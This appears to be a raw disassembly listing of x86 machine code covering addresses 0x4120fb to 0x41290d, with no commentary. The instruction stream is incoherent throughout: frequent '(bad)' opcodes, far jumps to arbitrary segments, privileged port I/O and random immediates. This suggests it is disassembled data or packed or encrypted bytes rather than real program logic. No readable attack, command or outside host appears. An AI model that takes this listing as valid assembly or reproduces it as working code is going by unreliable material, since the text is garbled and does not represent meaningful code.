  4120fb:	fld    TBYTE PTR [edi-0x74198892]
  412101:	cwde   
  412102:	(bad)  
  412104:	sub    BYTE PTR [esi],ch
  412106:	mov    al,es:0x1192529c
  41210c:	es jmp 0x5648:0xb96d4ae1
  412114:	mov    ah,0x33
  412116:	(bad)  
  412118:	or     BYTE PTR [edi-0x7a],ah
  41211b:	mov    fs,WORD PTR [eax+0x2c9aa432]
  412121:	inc    edx
  412122:	pop    ss
  412123:	push   ebx
  412124:	sub    bl,BYTE PTR [ecx+eax*2-0x6f40ada0]
  41212b:	jmp    0xf89:0xbf355b4b
  412132:	sbb    ch,BYTE PTR [ebp+ecx*8-0x1a]
  412136:	mov    eax,edx
  412138:	dec    ecx
  412139:	and    cl,BYTE PTR [edi+0xc70163b]
  41213f:	xchg   BYTE PTR [edi+0x1fcf6616],dh
  412145:	hlt    
  412146:	xchg   edx,eax
  412147:	mov    ebx,0xac217e32
  41214c:	pop    ebx
  41214d:	mov    edx,0x62bdeb51
  412152:	mov    dl,0x92
  412154:	cli    
  412155:	mov    edx,0xa8697773
  41215a:	cmp    eax,0x2ece38a
  41215f:	mov    eax,ds:0xd7b5810e
  412164:	inc    eax
  412165:	adc    edx,DWORD PTR ds:0x66da29b
  41216b:	jge    0x4120f6
  41216d:	fwait
  41216e:	xchg   BYTE PTR [ecx-0x49],al
  412171:	jg     0x412188
  412173:	sbb    al,0xdd
  412175:	es call 0x5a30:0xf74e87c4
  41217d:	outs   dx,BYTE PTR ds:[esi]
  41217e:	push   cs
  41217f:	fs mov edx,0x550a0884
  412185:	xchg   BYTE PTR [esi-0x5f],cl
  412188:	cli    
  412189:	xor    al,0x7f
  41218b:	push   es
  41218c:	adc    al,BYTE PTR [edx+0x25f7221b]
  412192:	es pop ds
  412194:	pop    es
  412195:	test   DWORD PTR [esi+0x21e9a35d],eax
  41219b:	into   
  41219c:	inc    ebp
  41219d:	mov    bl,0xb7
  41219f:	mov    esp,DWORD PTR [edx]
  4121a1:	xchg   edi,eax
  4121a2:	popa   
  4121a3:	(bad)  
  4121a5:	mov    eax,ds:0xee5efc8a
  4121aa:	push   ebx
  4121ab:	jno    0x412223
  4121ad:	pop    edx
  4121ae:	and    BYTE PTR [eax],0x4c
  4121b1:	nop
  4121b2:	mov    ebp,0xe141b2cd
  4121b7:	adc    al,0x8a
  4121b9:	aam    0x12
  4121bb:	dec    eax
  4121bc:	fstp   TBYTE PTR [edx+0x21fa5d64]
  4121c2:	jno    0x4121f7
  4121c4:	repnz icebp 
  4121c6:	imul   edi,DWORD PTR [ecx-0x74],0x2f08111
  4121cd:	cmp    BYTE PTR [esi+0x27],dl
  4121d0:	int3   
  4121d1:	push   esp
  4121d2:	ss mov edx,0x410d3705
  4121d8:	pop    ebx
  4121d9:	shl    DWORD PTR [ebx],cl
  4121db:	pusha  
  4121dc:	adc    eax,0x76dbe59f
  4121e1:	push   ebp
  4121e2:	popf   
  4121e3:	add    al,0x0
  4121e5:	add    edi,DWORD PTR [ebx]
  4121e7:	xchg   esi,eax
  4121e8:	mov    bl,BYTE PTR [ecx-0x58a65b77]
  4121ee:	cmp    eax,0xab4a9b0b
  4121f3:	sub    eax,0x8b17d8c8
  4121f8:	push   es
  4121f9:	dec    esi
  4121fa:	adc    al,0x84
  4121fc:	push   0xeb8050fb
  412201:	xor    eax,0xfc32bb10
  412206:	out    0x61,eax
  412208:	adc    DWORD PTR [ebx-0xd9c5d1],0xf450cdf7
  412212:	mov    ecx,gs
  412214:	js     0x4121fc
  412216:	xchg   edi,eax
  412217:	push   esi
  412218:	or     eax,0x49e40e85
  41221d:	cdq    
  41221e:	jbe    0x41221c
  412220:	dec    esp
  412221:	lahf   
  412222:	mov    dl,0x9a
  412224:	mov    esp,es
  412226:	sub    edi,esp
  412228:	xchg   ebp,eax
  412229:	dec    ebp
  41222a:	pusha  
  41222b:	shl    DWORD PTR ds:0xa85fe55e,cl
  412231:	and    DWORD PTR [edx],0xffffff80
  412234:	push   ds
  412235:	mov    esi,0xf34f31f1
  41223a:	xchg   esp,eax
  41223b:	push   cs
  41223c:	mov    al,0x17
  41223e:	or     BYTE PTR [esi],cl
  412240:	or     eax,0xd29f393c
  412245:	push   ds
  412246:	jo     0x4122aa
  412248:	repz xchg edi,eax
  41224a:	repnz pop edx
  41224c:	rol    BYTE PTR [edx+0x5019988c],cl
  412252:	adc    edx,esp
  412254:	sbb    dl,al
  412256:	mov    dh,0xc8
  412258:	cmp    DWORD PTR [ebx],ebx
  41225a:	jns    0x4121e7
  41225c:	cmp    ch,BYTE PTR gs:[ecx+0x73]
  412260:	mov    dl,0x8c
  412262:	test   eax,0xffd7f5d8
  412267:	clc    
  412268:	mov    ds:0x934de772,eax
  41226d:	mov    cl,0x6c
  41226f:	jb     0x41229e
  412271:	loope  0x4122a4
  412273:	shl    BYTE PTR [esi],cl
  412275:	push   esi
  412276:	xchg   edi,eax
  412277:	push   edx
  412278:	mov    WORD PTR [ecx+0x63374ca3],ss
  41227e:	adc    edx,edx
  412280:	or     BYTE PTR [ebx],0x6b
  412283:	xor    ebp,ecx
  412285:	inc    ebx
  412286:	mov    edi,0xb6238af9
  41228b:	cmp    DWORD PTR [edx+0x34],0xe7a9f1a1
  412292:	rcl    ebx,cl
  412294:	xor    ebx,DWORD PTR [esi+eiz*2-0x48]
  412298:	mov    ecx,0x6180d0f4
  41229d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41229e:	mov    eax,0xc539c041
  4122a3:	sbb    cl,BYTE PTR [eax-0x627a6cb0]
  4122a9:	js     0x412263
  4122ab:	push   0x4d
  4122ad:	push   0x42
  4122af:	and    BYTE PTR [esi],al
  4122b1:	dec    eax
  4122b2:	mov    WORD PTR [ecx+0x53d190f3],fs
  4122b8:	fadd   QWORD PTR [edi-0xb6d7c9e]
  4122be:	iret   
  4122bf:	mov    esp,esp
  4122c1:	inc    ebx
  4122c2:	mov    DWORD PTR [eax+eax*8-0x352240e3],esi
  4122c9:	push   cs
  4122ca:	outs   dx,DWORD PTR ds:[esi]
  4122cb:	fwait
  4122cc:	test   BYTE PTR [edi+edx*8-0x16],dl
  4122d0:	mov    bl,0x13
  4122d2:	xchg   edx,eax
  4122d3:	mov    esi,0x53cdbc8b
  4122d8:	push   ecx
  4122d9:	aas    
  4122da:	ret    0x4b1b
  4122dd:	and    eax,eax
  4122df:	test   BYTE PTR [edi+ebx*8-0x61],0x9f
  4122e4:	inc    edx
  4122e5:	and    ecx,ebx
  4122e7:	jge    0x4122bb
  4122e9:	push   cs
  4122ea:	dec    eax
  4122eb:	mov    eax,0x5ac751a3
  4122f0:	in     al,dx
  4122f1:	xor    dh,dl
  4122f3:	cli    
  4122f4:	rol    esp,1
  4122f6:	cli    
  4122f7:	rol    BYTE PTR [edx+0x2],1
  4122fa:	add    al,BYTE PTR [edx+0x60]
  4122fd:	inc    ebp
  4122fe:	sub    ah,BYTE PTR [ecx]
  412300:	lahf   
  412301:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412302:	int3   
  412303:	dec    ecx
  412304:	and    al,0xbb
  412306:	ds dec ebx
  412308:	xor    eax,0x763e2abe
  41230d:	jg     0x4122f2
  41230f:	jg     0x412350
  412311:	jo     0x41237d
  412313:	fimul  DWORD PTR [esi-0x31]
  412316:	xchg   esp,eax
  412317:	call   0x95a2ad54
  41231c:	loopne 0x41236b
  41231e:	mov    ss,WORD PTR [edx+esi*1+0x5b9ea72a]
  412325:	out    dx,al
  412326:	pop    ebp
  412327:	adc    eax,0xf1c03a05
  41232c:	push   esp
  41232d:	sbb    DWORD PTR [eax+0x73],ecx
  412330:	add    eax,0x43aafcff
  412335:	sub    ebp,0x5d7bd228
  41233b:	dec    esp
  41233c:	shl    DWORD PTR ds:0x349865f7,1
  412342:	rcr    ah,0xe3
  412345:	es cs ins DWORD PTR es:[edi],dx
  412348:	xlat   BYTE PTR ds:[ebx]
  412349:	(bad)  
  41234a:	push   ebp
  41234b:	sbb    al,0x1e
  41234d:	outs   dx,BYTE PTR ds:[esi]
  41234e:	js     0x41235d
  412350:	(bad)  
  412351:	arpl   WORD PTR [ecx-0x1f],sp
  412354:	sbb    eax,DWORD PTR [ebx+0x45]
  412357:	(bad)  
  412358:	xchg   ebx,eax
  412359:	mov    edi,DWORD PTR [esi]
  41235b:	jno    0x41230c
  41235d:	pop    edi
  41235e:	cmc    
  41235f:	in     al,dx
  412360:	mov    ebx,0xace28959
  412365:	hlt    
  412366:	imul   DWORD PTR [ecx-0x47]
  412369:	aaa    
  41236a:	dec    ebp
  41236b:	out    dx,eax
  41236c:	mov    cl,0xde
  41236e:	add    eax,0x9b851525
  412373:	inc    DWORD PTR [esi+0x1c]
  412376:	leave  
  412377:	out    dx,eax
  412378:	pusha  
  412379:	repnz mov cl,0xdc
  41237c:	adc    DWORD PTR [esi],ebx
  41237e:	int3   
  41237f:	mov    ebx,0x80665f45
  412384:	cli    
  412385:	push   0xc7afcaac
  41238a:	scas   eax,DWORD PTR es:[edi]
  41238b:	daa    
  41238c:	ins    BYTE PTR es:[edi],dx
  41238d:	popf   
  41238e:	inc    esi
  41238f:	add    al,0xab
  412391:	add    eax,0xcde4c998
  412396:	lods   eax,DWORD PTR ds:[esi]
  412397:	mov    cl,BYTE PTR [edx+0x3b]
  41239a:	dec    edi
  41239b:	add    dh,ch
  41239d:	lea    eax,[ebx+0x36]
  4123a0:	int3   
  4123a1:	mov    ch,0xd4
  4123a3:	sub    ebp,edx
  4123a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4123a6:	out    dx,al
  4123a7:	cmp    eax,esi
  4123a9:	mov    esp,gs
  4123ab:	ror    DWORD PTR [esi+0x605fa3b6],cl
  4123b1:	in     eax,dx
  4123b2:	aam    0x87
  4123b4:	sub    ebp,0x15
  4123b7:	sbb    eax,0xec433c79
  4123bc:	sub    eax,0x3da8acd6
  4123c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4123c2:	imul   esp,DWORD PTR [ecx+eiz*1],0x56
  4123c6:	(bad)  
  4123c7:	(bad)  
  4123c8:	jl     0x41243f
  4123ca:	jg     0x4123d2
  4123cc:	mov    bh,0x35
  4123ce:	jmp    0x8cdf:0xd4af6016
  4123d5:	sub    eax,0x9a6eabd0
  4123da:	and    DWORD PTR [ecx+0x27],esi
  4123dd:	in     al,dx
  4123de:	out    dx,eax
  4123df:	dec    ecx
  4123e0:	inc    ecx
  4123e1:	je     0x41236e
  4123e3:	cli    
  4123e4:	pop    edx
  4123e5:	lods   al,BYTE PTR ds:[esi]
  4123e6:	sub    dl,0xd
  4123e9:	push   eax
  4123ea:	fsubr  DWORD PTR [ecx]
  4123ec:	out    dx,al
  4123ed:	add    ebx,DWORD PTR [edi-0x56b4b6c7]
  4123f3:	jnp    0x412391
  4123f5:	inc    edi
  4123f6:	push   ebp
  4123f7:	dec    eax
  4123f8:	iret   
  4123f9:	push   es
  4123fa:	out    dx,eax
  4123fb:	pushf  
  4123fc:	in     al,dx
  4123fd:	fidivr WORD PTR [esi+0x2e8e3c07]
  412403:	mov    edx,0xa1f5a9c
  412408:	(bad)  [ebp-0x6b]
  41240b:	pushf  
  41240c:	retf   0x1193
  41240f:	jno    0x4123e3
  412411:	jmp    0xf9ba:0xe13664e7
  412418:	adc    dl,BYTE PTR [eax]
  41241a:	pop    esp
  41241b:	push   eax
  41241c:	xor    ebx,DWORD PTR [esi+ecx*8]
  41241f:	xor    al,0x96
  412421:	xchg   esi,eax
  412422:	xchg   ecx,eax
  412423:	mov    al,0xf6
  412425:	mov    al,0x39
  412427:	pop    esi
  412428:	dec    esi
  412429:	push   ss
  41242a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41242b:	(bad)  
  41242c:	popa   
  41242d:	shl    BYTE PTR ds:0xc1ef8182,cl
  412433:	icebp  
  412434:	not    BYTE PTR [esi+0x37]
  412437:	fmul   QWORD PTR [ebx-0x91a54e3]
  41243d:	xor    eax,0xed5e26ff
  412442:	mov    ds:0x329d9586,eax
  412447:	jmp    0xb757:0xa201626a
  41244e:	mov    dl,0x4d
  412450:	lds    ecx,FWORD PTR [esi-0x4f]
  412453:	repz hlt 
  412455:	out    0xa7,eax
  412457:	das    
  412458:	nop
  412459:	loop   0x412492
  41245b:	dec    ecx
  41245c:	mov    eax,DWORD PTR [edi+edx*4]
  41245f:	push   eax
  412460:	add    DWORD PTR [eax-0x21292393],esp
  412466:	scas   al,BYTE PTR es:[edi]
  412467:	jp     0x41248b
  412469:	and    esp,DWORD PTR [edx+0x4e]
  41246c:	mov    dh,0xf3
  41246e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41246f:	rcr    BYTE PTR [ebx-0xa],0x78
  412473:	es stc 
  412475:	cmp    al,0xaa
  412477:	dec    ebp
  412478:	pop    esp
  412479:	lds    esp,FWORD PTR [ecx+0x63]
  41247c:	pop    es
  41247d:	sbb    esi,DWORD PTR [edx-0x7d]
  412480:	and    edi,DWORD PTR ds:0xa791c42e
  412486:	out    dx,al
  412487:	cld    
  412488:	mov    al,ds:0x7ab7fcbc
  41248d:	shld   DWORD PTR [ebx],eax,cl
  412490:	jno    0x412465
  412492:	(bad)  
  412494:	ss adc dl,ah
  412497:	aaa    
  412498:	xor    eax,0x5ddf98a1
  41249d:	jle    0x412425
  41249f:	lock (bad) 
  4124a1:	jecxz  0x41249d
  4124a3:	dec    ecx
  4124a4:	jnp    0x41250d
  4124a6:	cmp    DWORD PTR ss:0x7ee064cf,esp
  4124ad:	jbe    0x4124e0
  4124af:	mov    al,ds:0x2ff8e2a1
  4124b4:	add    al,0x55
  4124b6:	xchg   edi,eax
  4124b7:	cmc    
  4124b8:	adc    DWORD PTR [ebp+0x40],edi
  4124bb:	and    esi,DWORD PTR [ebx+0x62dfe2ec]
  4124c1:	jmp    0xc789:0xe3c7369f
  4124c8:	and    eax,0x1b7ed4b3
  4124cd:	pop    eax
  4124ce:	push   edi
  4124cf:	pop    esi
  4124d0:	shl    DWORD PTR [ebx-0x32],cl
  4124d3:	push   0xd2649cce
  4124d8:	mov    ds:0x10b145b9,eax
  4124dd:	lock dec edi
  4124df:	pop    ebx
  4124e0:	(bad)  
  4124e1:	push   eax
  4124e2:	push   0xa623d30a
  4124e7:	retf   
  4124e8:	fisub  DWORD PTR [ebx+0x4d]
  4124eb:	inc    DWORD PTR [edi]
  4124ed:	jp     0x4124a0
  4124ef:	or     ch,BYTE PTR [ecx+0x364652f1]
  4124f5:	pop    esi
  4124f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4124f7:	push   0x6d
  4124f9:	sbb    DWORD PTR [esi],edx
  4124fb:	(bad)  
  4124fc:	mov    ebx,0x5cd20af9
  412501:	test   eax,0x282885f6
  412506:	sbb    BYTE PTR [eax+eax*2],al
  412509:	push   esp
  41250a:	or     BYTE PTR [ebx-0x2351c28a],ch
  412510:	or     ebp,DWORD PTR [ecx-0x2f]
  412513:	(bad)  
  412515:	mov    BYTE PTR [ecx+0x2b],dh
  412518:	xchg   ebp,eax
  412519:	xor    bh,bl
  41251b:	mov    ebx,DWORD PTR [eax-0x33627208]
  412521:	sub    BYTE PTR [ecx-0x14],bh
  412524:	cmc    
  412525:	aam    0x72
  412527:	adc    al,BYTE PTR [ebp+0x489df80]
  41252d:	mov    ds:0x32175063,al
  412532:	ret    0x34f8
  412535:	sbb    al,BYTE PTR ds:0xf77c28bf
  41253b:	das    
  41253c:	cdq    
  41253d:	mov    dl,0x35
  41253f:	outs   dx,DWORD PTR ds:[esi]
  412540:	retf   0xcedc
  412543:	sbb    al,bh
  412545:	cdq    
  412546:	sbb    eax,0x6e2bd95d
  41254b:	dec    esi
  41254c:	stos   DWORD PTR es:[edi],eax
  41254d:	sbb    DWORD PTR [edx-0x44],edi
  412550:	iret   
  412551:	sbb    ah,bh
  412553:	mov    BYTE PTR [ecx+0x19b69c0b],al
  412559:	push   ds
  41255a:	call   0x6d0aa83
  41255f:	inc    esi
  412560:	xchg   ebx,eax
  412561:	pop    eax
  412562:	jmp    0x7fa1eb04
  412567:	ins    DWORD PTR es:[edi],dx
  412568:	push   0x30
  41256a:	sbb    al,0x35
  41256c:	xchg   BYTE PTR [edi],bl
  41256e:	fisttp QWORD PTR [esi-0x1eb7a3f4]
  412574:	retf   
  412575:	and    esi,DWORD PTR [eax]
  412577:	push   ecx
  412578:	cmp    al,0xe0
  41257a:	out    0x66,eax
  41257c:	jbe    0x412530
  41257e:	adc    BYTE PTR [ebx-0x672cd888],bl
  412584:	adc    al,0x77
  412586:	fucomip st,st(6)
  412588:	xchg   ebx,eax
  412589:	mov    dl,0x72
  41258b:	shr    BYTE PTR ds:0x235287a5,0x85
  412592:	sbb    al,0x20
  412594:	mov    ds:0xa6ab45e5,al
  412599:	xor    cl,BYTE PTR [edx+0x6e73e6ce]
  41259f:	inc    eax
  4125a0:	(bad)  
  4125a1:	xchg   ebx,eax
  4125a2:	fild   DWORD PTR ds:0x841a613f
  4125a8:	adc    dh,BYTE PTR [eax]
  4125aa:	add    eax,0xe5cdec1a
  4125af:	push   eax
  4125b0:	and    BYTE PTR [esi-0x6e],dh
  4125b3:	jae    0x412543
  4125b5:	je     0x412629
  4125b7:	add    eax,0x4d263212
  4125bc:	cmc    
  4125bd:	mov    BYTE PTR [edi-0x42],dl
  4125c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4125c1:	fiadd  WORD PTR [eax-0x2553237c]
  4125c7:	xor    ebx,DWORD PTR [eax+0x30aec066]
  4125cd:	jo     0x4125bd
  4125cf:	test   ah,0xa2
  4125d2:	ds das 
  4125d4:	push   edi
  4125d5:	xor    al,0xc6
  4125d7:	mov    ds:0x265df6ff,eax
  4125dc:	mov    DWORD PTR [edx],0x94d0a16b
  4125e2:	ficomp WORD PTR [ebx]
  4125e4:	ins    DWORD PTR es:[di],dx
  4125e6:	sub    ah,BYTE PTR [ebp+0x3b088630]
  4125ec:	lea    eax,[ebx+esi*1+0x66]
  4125f0:	pop    esi
  4125f1:	xchg   edx,eax
  4125f2:	jb     0x41259e
  4125f4:	sub    BYTE PTR [esi-0x25772f2c],0x94
  4125fb:	ret    
  4125fc:	mov    WORD PTR [ebp+0x1d775654],ss
  412602:	push   ebp
  412603:	repnz and al,0xb9
  412606:	das    
  412607:	mov    al,ds:0x546dfbef
  41260c:	and    DWORD PTR [esi-0x6b],0xf1463e
  412613:	cmp    BYTE PTR [ecx+0x502bfdd7],0x9c
  41261a:	jno    0x41268c
  41261c:	cwde   
  41261d:	scas   al,BYTE PTR es:[edi]
  41261e:	jle    0x412644
  412620:	cwde   
  412621:	test   eax,0x6ec969fe
  412626:	adc    esi,eax
  412628:	gs mov ?,edx
  41262b:	rcr    BYTE PTR [eax-0x80],1
  41262e:	pop    esi
  41262f:	int    0xb3
  412631:	int    0x69
  412633:	ret    0x1480
  412636:	add    ecx,DWORD PTR [edi+0xe]
  412639:	add    al,0xed
  41263b:	loopne 0x4125c5
  41263d:	ss xchg edx,eax
  41263f:	lods   eax,DWORD PTR ds:[esi]
  412640:	pop    esp
  412641:	pop    esi
  412642:	call   0x1a6be7b3
  412647:	(bad)  
  412648:	fadd   DWORD PTR [esi-0x24640600]
  41264e:	pop    esp
  41264f:	inc    eax
  412650:	fisubr WORD PTR [edx+eiz*2-0x4f6a5f66]
  412657:	int    0x40
  412659:	pop    esp
  41265a:	and    ah,BYTE PTR [eax]
  41265c:	mov    al,0xf3
  41265e:	int    0x7c
  412660:	jae    0x41267e
  412662:	mov    ecx,0xb22c1cf0
  412667:	inc    ebx
  412668:	mov    cl,0x24
  41266a:	xchg   BYTE PTR [eax-0x3],ch
  41266d:	pop    edx
  41266e:	ins    DWORD PTR es:[edi],dx
  41266f:	adc    edx,edi
  412671:	arpl   WORD PTR [bp+si],ax
  412674:	cmp    BYTE PTR [esp+ebx*1+0x69],dh
  412678:	popa   
  412679:	mov    ds:0xc9de4974,al
  41267e:	sub    al,0x88
  412680:	pusha  
  412681:	cmp    ch,BYTE PTR [ebx+0x31]
  412684:	push   es
  412685:	cmp    BYTE PTR [eax+0x75f1c41],0xd6
  41268c:	mov    ch,0xf6
  41268e:	mov    ds:0x56b09f8d,eax
  412693:	pop    edi
  412694:	xchg   ebx,eax
  412695:	mov    cl,0x38
  412697:	or     dh,cl
  412699:	mov    ebx,0xffefc268
  41269e:	cdq    
  41269f:	add    dl,BYTE PTR [edx+0x5db9b80c]
  4126a5:	sub    dl,BYTE PTR [esp+edx*1-0xa]
  4126a9:	andnps xmm1,XMMWORD PTR [ecx-0x5f]
  4126ad:	lea    ebp,[eax+0x631b5724]
  4126b3:	and    edi,DWORD PTR [ebx-0x2c]
  4126b6:	push   0xffffffa5
  4126b8:	mov    ah,0x22
  4126ba:	inc    esi
  4126bb:	nop
  4126bc:	jns    0x41270c
  4126be:	in     eax,dx
  4126bf:	adc    cl,ch
  4126c1:	mov    bh,0x6a
  4126c3:	mov    WORD PTR [eax],gs
  4126c5:	push   esp
  4126c6:	inc    edx
  4126c7:	(bad)  
  4126c8:	dec    DWORD PTR [edi]
  4126ca:	aas    
  4126cb:	cmp    al,0xb1
  4126cd:	sbb    ebx,DWORD PTR [ecx]
  4126cf:	in     eax,dx
  4126d0:	sbb    esi,esi
  4126d2:	jl     0x412719
  4126d4:	or     al,0x92
  4126d7:	test   DWORD PTR [ecx-0x51],esp
  4126da:	xchg   ecx,eax
  4126db:	dec    esp
  4126dc:	stc    
  4126dd:	fsubr  DWORD PTR [esp+edx*1-0x10]
  4126e1:	and    BYTE PTR [edi-0x3e75db7e],bl
  4126e7:	imul   ebx,DWORD PTR [eax],0xffffff95
  4126ea:	xchg   ebp,eax
  4126eb:	arpl   ax,cx
  4126ed:	pop    ecx
  4126ee:	push   esp
  4126ef:	or     eax,0x6a7b6d9e
  4126f4:	loope  0x4126de
  4126f6:	inc    ecx
  4126f7:	dec    ebp
  4126f8:	dec    ecx
  4126f9:	fwait
  4126fa:	cli    
  4126fb:	dec    esi
  4126fc:	je     0x412746
  4126fe:	clc    
  4126ff:	xor    al,0xb9
  412701:	std    
  412702:	xor    eax,0xaebd3935
  412707:	cmp    cl,ah
  412709:	sub    bl,0xdd
  41270c:	cmp    BYTE PTR [ecx+0x345ab507],dl
  412712:	inc    ebp
  412713:	dec    esp
  412714:	bound  esi,QWORD PTR [ebx-0xcedf58d]
  41271a:	mov    cl,0xf9
  41271c:	fdivp  st(0),st
  41271e:	adc    bl,BYTE PTR [ecx+0xc893131]
  412724:	js     0x41275e
  412726:	lods   eax,DWORD PTR ds:[esi]
  412727:	jmp    0xe76c:0xee9d598c
  41272e:	aaa    
  41272f:	sub    BYTE PTR [ecx-0x979fc2c],dl
  412735:	lock (bad) 
  412737:	ins    BYTE PTR es:[edi],dx
  412738:	xchg   edx,eax
  412739:	xchg   esp,eax
  41273a:	mov    al,ds:0x7df6cc9c
  41273f:	mov    esi,0xf5686f6c
  412744:	mov    bl,0xb
  412746:	arpl   WORD PTR [ebx],bx
  412748:	adc    BYTE PTR [eax+0x65da90e5],bh
  41274e:	xchg   esi,eax
  41274f:	retf   
  412750:	push   eax
  412751:	pop    ds
  412752:	stc    
  412753:	arpl   WORD PTR [esi-0x7b434d1f],dx
  412759:	rcr    BYTE PTR [edx+0x4b],cl
  41275c:	sbb    ecx,DWORD PTR [ecx]
  41275e:	jg     0x412732
  412760:	push   es
  412761:	sbb    ch,bh
  412763:	dec    ebp
  412764:	jo     0x412733
  412766:	into   
  412767:	aam    0xd3
  412769:	int    0xdc
  41276b:	inc    esp
  41276c:	sbb    al,ch
  41276e:	out    dx,eax
  41276f:	(bad)  
  412770:	push   ss
  412771:	mov    edx,DWORD PTR [ecx-0x8e4b16e]
  412777:	sbb    BYTE PTR [eax],0x25
  41277a:	add    al,BYTE PTR [esp+esi*1+0x59]
  41277e:	jne    0x41278b
  412780:	xchg   esi,eax
  412781:	xchg   edi,eax
  412782:	or     DWORD PTR [ecx],ecx
  412784:	test   DWORD PTR [ebp+0x20],edx
  412787:	mov    BYTE PTR ds:0x966cd144,0x2e
  41278e:	sbb    DWORD PTR [edi+0x57e90f15],ebp
  412794:	pusha  
  412795:	mov    ds:0xb35236c8,eax
  41279a:	int3   
  41279b:	mov    ds,WORD PTR [ecx+0x638224ff]
  4127a1:	mov    edi,0x875890b7
  4127a6:	int3   
  4127a7:	mov    edi,0xeded929c
  4127ac:	mov    ah,0x22
  4127ae:	jnp    0x412780
  4127b0:	and    DWORD PTR [eax+0x4f],ebx
  4127b3:	fiadd  WORD PTR [ebp+0x6e]
  4127b6:	cmp    dl,BYTE PTR [esi]
  4127b8:	stos   DWORD PTR es:[edi],eax
  4127b9:	call   0x4343:0xa3150e62
  4127c0:	inc    ebx
  4127c1:	push   ebp
  4127c2:	xchg   ebp,eax
  4127c3:	outs   dx,BYTE PTR ds:[esi]
  4127c4:	sbb    BYTE PTR [ebx+0x6b61f129],0x83
  4127cb:	add    esp,DWORD PTR [edi-0x55]
  4127ce:	mov    ss,WORD PTR [esi+0xd]
  4127d1:	clc    
  4127d2:	and    esi,DWORD PTR [edx+edi*4]
  4127d5:	(bad)  
  4127d6:	jo     0x41283c
  4127d8:	dec    ebx
  4127d9:	test   cl,bh
  4127db:	dec    edi
  4127dc:	jne    0x412775
  4127de:	repnz mov ?,ebx
  4127e1:	fmul   QWORD PTR [ebx]
  4127e3:	pusha  
  4127e4:	xor    eax,0x4fdbb952
  4127e9:	xchg   BYTE PTR [edi+0x50],ch
  4127ec:	xchg   esp,eax
  4127ed:	idiv   BYTE PTR [ebp-0x55]
  4127f0:	popf   
  4127f1:	pop    ss
  4127f2:	cs cmc 
  4127f4:	dec    edi
  4127f5:	inc    ebp
  4127f6:	or     eax,0x152352dc
  4127fb:	pop    ecx
  4127fc:	test   BYTE PTR [esi+0x36],ch
  4127ff:	and    ah,al
  412801:	les    esp,FWORD PTR [esi]
  412803:	ret    0xd532
  412806:	push   0x7e
  412808:	leave  
  412809:	jbe    0x41282e
  41280b:	or     edx,DWORD PTR [ebx]
  41280d:	or     ah,ah
  41280f:	icebp  
  412810:	push   ebx
  412811:	mov    eax,0x52329404
  412816:	mov    ds:0xaa0e85a8,eax
  41281b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41281c:	mov    ecx,0xb1a1eff1
  412821:	lds    ebx,FWORD PTR [edi-0xf]
  412824:	into   
  412825:	dec    ebp
  412826:	scas   eax,DWORD PTR es:[edi]
  412827:	jle    0x41280e
  412829:	jmp    0x4127fa
  41282b:	retf   
  41282c:	cmp    eax,0xfa8909d0
  412831:	push   0x91df739a
  412836:	or     al,0x2d
  412838:	fld    TBYTE PTR [ebx-0x3264ba82]
  41283e:	push   eax
  41283f:	push   ebx
  412840:	ins    BYTE PTR es:[edi],dx
  412841:	xchg   ebx,eax
  412842:	xor    DWORD PTR [edi-0x6],ebx
  412845:	(bad)  
  412847:	cmp    BYTE PTR ds:0x9d0cdbb9,cl
  41284d:	gs xchg esi,eax
  41284f:	out    0x8a,eax
  412851:	dec    esp
  412852:	gs mov esp,0x12e45693
  412858:	xchg   edi,eax
  412859:	pop    edx
  41285a:	rcr    esi,0x5f
  41285d:	cmp    edx,edx
  41285f:	ins    DWORD PTR es:[edi],dx
  412860:	mov    esi,0x4202dc8b
  412865:	test   eax,0x6517b79a
  41286a:	ret    0xc65b
  41286d:	dec    esp
  41286e:	mov    ds:0xeed52cff,eax
  412873:	mov    al,ds:0x1fb12d0
  412878:	pop    ss
  412879:	sub    edx,edx
  41287b:	fnstsw WORD PTR [esi]
  41287d:	mov    ebx,0xf18bde96
  412882:	cdq    
  412883:	jbe    0x41285f
  412885:	hlt    
  412886:	daa    
  412887:	mov    edi,0x1370b66a
  41288c:	or     ebp,ebp
  41288e:	push   ds
  41288f:	jno    0x4128e3
  412891:	test   al,0x35
  412893:	xor    esi,edx
  412895:	mov    cl,0xb1
  412897:	sbb    eax,0x9254f18a
  41289c:	ds jge 0x412870
  41289f:	ss sub al,0x7d
  4128a2:	jle    0x412917
  4128a4:	and    al,0x1
  4128a6:	idiv   DWORD PTR [edi]
  4128a8:	sub    BYTE PTR [ebx+0x0],dl
  4128ab:	push   ds
  4128ac:	xchg   bl,ch
  4128ae:	xor    eax,0xb84017e8
  4128b3:	dec    ebp
  4128b4:	sbb    al,ah
  4128b6:	in     al,0x5d
  4128b8:	xor    edi,DWORD PTR [edi]
  4128ba:	fstp   DWORD PTR [edx+0x61]
  4128bd:	aas    
  4128be:	inc    ebx
  4128bf:	jbe    0x412864
  4128c1:	fidiv  WORD PTR [esi+0x3345f0ab]
  4128c8:	fisttp WORD PTR [edi+0x44]
  4128cb:	sti    
  4128cc:	mov    ds:0x2d1282cd,eax
  4128d1:	sub    eax,0x8ae013a5
  4128d6:	xor    BYTE PTR [ecx-0x4df87ecf],0xa7
  4128dd:	fldcw  WORD PTR [edi+0x52]
  4128e0:	inc    esi
  4128e1:	xchg   edx,eax
  4128e2:	out    dx,al
  4128e3:	jge    0x41287f
  4128e5:	sbb    esp,esi
  4128e7:	jle    0x412940
  4128e9:	inc    edi
  4128ea:	sub    ebp,ecx
  4128ec:	mov    ds:0x9c054e8,al
  4128f1:	mov    edi,0xce26127f
  4128f6:	dec    eax
  4128f7:	sbb    al,0xf9
  4128f9:	push   edx
  4128fa:	retf   0x1677
  4128fd:	mov    BYTE PTR [ebx+0xc],al
  412900:	adc    al,BYTE PTR [esi]
  412902:	mov    bh,0x91
  412904:	push   ebp
  412905:	in     eax,dx
  412906:	paddusw mm6,QWORD PTR [ebp+esi*8+0x29]
  41290b:	mov    ch,0xcb
  41290d:	cwde   
